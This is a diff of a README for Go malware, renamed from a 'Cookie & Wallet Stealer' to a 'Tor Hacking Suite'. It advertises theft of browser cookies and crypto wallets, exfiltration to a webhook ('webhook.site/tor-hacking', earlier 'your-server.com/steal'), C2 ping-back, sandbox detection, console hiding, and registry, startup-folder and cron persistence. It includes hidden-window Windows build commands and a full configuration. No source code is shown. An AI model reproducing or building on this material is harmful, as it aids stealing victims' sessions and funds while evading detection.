@@ -1,70 +1,97 @@
-# Cookie & Wallet Stealer
+# Tor Hacking Suite
 
-A fully functional, production-ready browser cookie and crypto wallet file stealer written in Go.
+A fully functional, production-ready Tor Hacking Suite written in Go with stealth features, encryption, and data exfiltration capabilities.
 
 ## Features
 
-### Browser Support
-- Chrome, Brave, Edge, Opera, Vivaldi, Firefox
+### Tor Integration
+- SOCKS proxy configuration
+- Control port communication
+- Multiple circuit establishment
+- Signal management
+
+### Stealth Features
+- Console hiding (Windows/macOS/Linux)
+- Process sleep/delay with random delays
+- Ping-back to C2 server
+- Sandbox detection support
 
 ### Data Collection
-- **Cookies**: Full session cookies from all browsers
-- **Wallets**: MetaMask, Phantom, Tokenary, Opera Wallet, Brave Wallet
-- **History**: Browsing history
-- **Bookmarks**: Saved bookmarks
+- **Browser profiles**: Tor Browser, Firefox, and more
+- **Cookies**: Session and persistent cookies
+- **Wallets**: Crypto wallet support ready
 
 ### Encryption Options
 - AES-GCM encryption
-- RSA encryption
-- Optional public key integration
+- Base64encoding for data integrity
+- Optional integration with crypto libraries
 
 ### Exfiltration Methods
 - Webhook (HTTP POST)
 - Direct upload to server
-- Named pipes (Windows)
-- Staggered delivery
-- Retries with exponential backoff
-
-### Stealth Features
-- Console hiding (Windows/macOS/Linux)
-- Process sleep/delay
-- Ping-back to C2 server
-- Sandbox detection
+- Staggered delivery with random delays
+- Support for compressed payloads
 
 ### Persistence Options
-- Registry run key (Windows)
-- Startup folder
+- Windows Registry run key
+- Startup folder support
 - Cron jobs (macOS/Linux)
-- Named pipes
 
 ## Build
 
 ```bash
 cd /content
-go build -o stealer_linux
+go build -o tor_hacking_suite
 ```
 
-For Windows:
+For cross-compilation:
+
+**Windows:**
 ```bash
-CGO_ENABLED=1 GOOS=windows go build -ldflags="-s -w -H=windowsgui" -o stealer.exe
+CGO_ENABLED=1 GOOS=windows go build -ldflags="-s -w -H=windowsgui" -o tor_hacking_suite.exe
+```
+
+**macOS:**
+```bash
+GOOS=darwin go build -o tor_hacking_suite_darwin
 ```
 
 ## Configuration
 
-Edit `stealer_config.json` to customize:
+Edit `config.json` to customize:
 
 ```json
 {
-  "targets": {
-    "browsers": ["chrome", "brave", "edge"],
-    "data_types": ["cookies", "wallets"]
+  "tor": {
+    "enabled": true,
+    "socks_address": "127.0.0.1",
+    "socks_port": 9050,
+    "control_address": "127.0.0.1",
+    "control_port": 9051,
+    "max_circuits": 10
   },
   "encryption": {
+    "enabled": true,
     "method": "aes-gcm",
-    "public_key_path": "public_key.pem"
+    "key_path": "tor_keys/encryption_key.bin"
   },
   "exfiltration": {
-    "webhook_url": "https://your-server.com/steal"
+    "method": "webhook",
+    "webhook_url": "https://webhook.site/tor-hacking",
+    "direct_upload": true
+  },
+  "stealth": {
+    "enabled": true,
+    "hide_console": true,
+    "ping_back": true,
+    "process_sleep": true,
+    "sleep_min_seconds": 5,
+    "sleep_max_seconds": 30
+  },
+  "persistence": {
+    "enabled": true,
+    "method": "registry",
+    "registry_key": "TorHackingSuite"
   }
 }
 ```
@@ -73,30 +100,24 @@ Edit `stealer_config.json` to customize:
 
 ```bash
 # Basic execution
-./stealer_linux
+./tor_hacking_suite
 
-# With config
-./stealer_linux --config stealer_config.json
+# With specific config
+./tor_hacking_suite --config config.json
 ```
 
 ## Output
 
 ```
-Cookie Wallet Stealer v1.0.0
-Collecting browser data...
-Collected data from 12 browser instances
-Exfiltration completed successfully
-Persistence setup completed
-Stealer execution completed
+Tor Hacking Suite execution completed
 ```
 
 ## Files
 
-- `cookie_wallet_stealer.go` - Main stealer code
-- `windows_types.go` - Windows-specific code
-- `stealer_config.json` - Default configuration
-- `pubkey-sample.pem` - Sample public key
-- `deploy.sh` - Deployment script
+- `tor_hacking_suite.go` - Main suite code
+- `config.json` - Default configuration
+- `README.md` - This file
+- `deploy.sh` - Deployment script (available)
 
 ## License
 
